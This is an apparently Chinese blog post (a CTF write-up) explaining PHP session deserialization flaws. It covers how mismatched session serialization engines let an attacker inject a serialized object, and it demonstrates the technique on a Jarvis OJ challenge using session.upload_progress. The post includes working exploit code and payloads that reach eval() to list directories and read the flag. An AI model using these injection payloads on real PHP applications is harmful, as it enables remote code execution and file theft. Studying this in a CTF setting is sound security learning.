@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>PHP的Session反序列化 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">PHP的Session反序列化</h2>
+            <div class="post-date">2020-01-25</div>
+            
+            <div class="post-content">
+              <p>对于反序列化。我们已知的有phar/unserialize。Session也是可以触发反序列化的<br>
+首先。我们看下php对于Session的各项配置</p>
+<!-- more -->
+<pre><code>session.save_path = &quot;/tmp&quot;
+#session保存到/tmp目录
+session.save_handler = files
+#session的存储方式。这里是存储为文件
+session.serialize_handler = php
+#session默认的序列化引擎是php
+session.auto_start = 0
+#session是否默认打开。即是否默认开启session_start()
+sess_sessionid
+#session默认是以sess_随机字符串命名
+</code></pre>
+<p>上面配置文件中。session默认的序列化指定为了php。当然。还有其他两种序列化引擎<code>php_binary</code>和<code>php_serialize</code><br>
+我们看看具体有什么不同<br>
+<strong>当php为序列化引擎时</strong></p>
+<pre><code>&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+$_SESSION['name']=$_GET['name'];
+?&gt;
+#name|s:4:&quot;test&quot;;
+</code></pre>
+<p>通过查看session文件。其中的序列化内容为<code>name|s:4:&quot;test&quot;;</code><br>
+这就是php序列化引擎的格式。name为键-对应$_SESSION['name']。竖杠后面是序列化的值<br>
+php序列化格式<code>键|序列化值</code><br>
+<strong>当php_binary为序列化引擎时</strong></p>
+<pre><code>&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+$_SESSION['name']=$_GET['name'];
+?&gt;
+#names:4:&quot;test&quot;;
+</code></pre>
+<p>php_binary序列化引擎。是以键:序列化值存储的<br>
+<strong>当php_serialize为序列化引擎时</strong></p>
+<pre><code>&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+$_SESSION['name']=$_GET['name'];
+?&gt;
+#a:1:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;}
+</code></pre>
+<p>php_serialize序列化引擎。和serialize函数差不多。<br>
+<img src="https://guokeya.github.io/post-images/1579952234388.png" alt="" loading="lazy"><br>
+<strong>Session序列化</strong><br>
+Session为什么会序列化呢。或者说。当什么情况下Session会进行序列化/反序列化<br>
+通过查看PHP手册。我们发现<br>
+session_start()即会话开始时。session就会通过指定的序列化引擎将<code>$_SESSION</code>序列化。然后放入文件进行存储。<br>
+相反。还会自动反序列化文件中存储的数据。然后填充到<code>$_SESSION</code></p>
+<pre><code>session_start()
+#session_start()-&gt;读取session文件内容-&gt;反序列化
+$_SESSION['name']='test';
+#serialize($_SESSION)-&gt;存入文件
+整个流程就是这样
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1579952041432.png" alt="" loading="lazy"><br>
+<strong>反序列化利用</strong><br>
+Session反序列化都是序列化引擎不一致导致存在安全问题<br>
+例如：<br>
+index.php</p>
+<pre><code>&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+$_SESSION['name']=$_GET['name'];
+var_dump($_SESSION);
+?&gt;
+</code></pre>
+<p>vuln.php</p>
+<pre><code>&lt;?php
+ini_set('session.serialize_handler', 'php');
+class A{
+	public $name;
+	public function __construct(){
+		$this-&gt;name='gk';
+	}
+	public function __destruct(){
+		echo $this-&gt;name;
+	}
+}
+session_start();
+var_dump($_SESSION);
+?&gt;
+</code></pre>
+<p>index.php设置的session序列化引擎是php_serialize<br>
+存储时会以serialize的格式序列化/反序列化<br>
+<img src="https://guokeya.github.io/post-images/1579953634894.png" alt="" loading="lazy"><br>
+但是。vuln.php设置的Session序列化引擎是php<br>
+php序列化引擎的格式是以|为标识进行序列化/反序列化<br>
+这么说。并没有很明显的安全问题<br>
+当我们index.php。name指定为|123时<br>
+php_serialize引擎存入文件的内容为</p>
+<pre><code>a:1:{s:4:&quot;name&quot;;s:4:&quot;|123&quot;;}
+</code></pre>
+<p>访问vuln.php。以php的引擎。反序列化这串内容。会是什么效果呢<br>
+<img src="https://guokeya.github.io/post-images/1579954031622.png" alt="" loading="lazy"><br>
+对。就是不能正常解析。php引擎以|为分割。|前面是值|后面才是要反序列化的内容<br>
+这里反序列化了123&quot;;}<br>
+这明显是不能正常反序列化的<br>
+|123是我们输出的name值。如果替换为一个类恶意序列化的字符串呢？</p>
+<pre><code>name输入|O:1:&quot;A&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;}
+php_serialize存入a:1:{s:4:&quot;name&quot;;s:35:&quot;|O:1:&quot;A&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;}&quot;;}
+</code></pre>
+<p>再次进入vuln.php。以php引擎反序列化以上的字符串。</p>
+<pre><code>以|为分割。反序列化O:1:&quot;A&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;}
+将类A的name值覆盖为了test。
+然后。反序列化会自动调用类A。由于name参数已经被我们成功修改了。那么下面析构函数。应该会输出test而不是默认的gk
+</code></pre>
+<p>果真如此<br>
+<code>a:1:{s:4:&quot;name&quot;;s:35:&quot;</code>被当成了键。值是Object对象A。其中name的值为test<br>
+<img src="https://guokeya.github.io/post-images/1579954433454.png" alt="" loading="lazy"><br>
+接下来拿一题CTF来练练手<br>
+<code>http://web.jarvisoj.com:32784/</code><br>
+<img src="https://guokeya.github.io/post-images/1579954748290.png" alt="" loading="lazy"><br>
+看源码得到如下信息：</p>
+<pre><code>1。session的存储引擎是php
+2。OowoO类。如果可以控制$mdzz。即可执行任意命令。默认是执行phpinfo
+</code></pre>
+<p>我们再去phpinfo看看有什么特殊配置。<br>
+Session的处理器不同。一个是php。一个是php_serialize。<br>
+<img src="https://guokeya.github.io/post-images/1579954946883.png" alt="" loading="lazy"><br>
+但是。index.php也没有php_serialize的页面让我们控制session内容<br>
+这里又有个新知识了<br>
+<img src="https://guokeya.github.io/post-images/1579955439623.png" alt="" loading="lazy"><br>
+通过查看php手册。我们发现<br>
+当POST一<code>session.upload_progress.enabled</code>时。上传文件的进度将会存放在$_SESSION中。<br>
+<img src="https://guokeya.github.io/post-images/1579955524137.png" alt="" loading="lazy"><br>
+还是做个实验比较清楚。<br>
+sess.php</p>
+<pre><code>&lt;?php
+session_start();
+var_dump($_SESSION);
+?&gt;
+</code></pre>
+<p>upload.html</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://192.168.0.158/sess.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;
+&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>直接空文件上传。将文件名改为你要反序列化的内容<br>
+看。$_SESSION就会包含我们上传的文件信息<br>
+<img src="https://guokeya.github.io/post-images/1579956577494.png" alt="" loading="lazy"><br>
+并且是先包含。在执行php内的代码<br>
+。那么针对这题。我们就有了意思<br>
+首先通过session.upload_progress。POST一个包含恶意OowoO类的序列化字符串<br>
+然后进入php代码中。<br>
+改变php引擎为php。再进行session_start()<br>
+而我们的恶意代码却是以默认php引擎执行的。<br>
+php_serialize+(恶意代码)。写入session文件-&gt;改变引擎为php-&gt;session_start()读取session文件反序列化-&gt;触发恶意代码<br>
+。就这样。<br>
+先把OowoO类的EXP写出来</p>
+<pre><code>&lt;?php
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&gt;mdzz = 'phpinfo();';
+    }
+    
+    function __destruct()
+    {
+        eval($this-&gt;mdzz);
+    }
+}
+$a=new OowoO();
+$a-&gt;mdzz=&quot;print_r(scandir(dirname(__FILE__)))&quot;;
+echo serialize($a);
+?&gt;
+</code></pre>
+<p>得到<code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></p>
+<pre><code>__DIR__
+得到当前目录名
+__FILE__
+得到当前文件的绝对路径
+dirname(__FILE__)
+得到绝对路径中的目录名
+</code></pre>
+<p>不知道为啥。这里用scandir('./')不行。会显示根目录。<br>
+用斜杠转义掉双引号。找到了flag<br>
+<img src="https://guokeya.github.io/post-images/1579957912481.png" alt="" loading="lazy"><br>
+得到目录名。接下来就读取flag了<br>
+<img src="https://guokeya.github.io/post-images/1579957965827.png" alt="" loading="lazy"><br>
+readfile/file_get_contents都行<br>
+<img src="https://guokeya.github.io/post-images/1579958029365.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/buuctfxiao-yi-de-u-pan/">
+                  <h3 class="post-title">
+                    [BUUCTF]小易的U盘
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
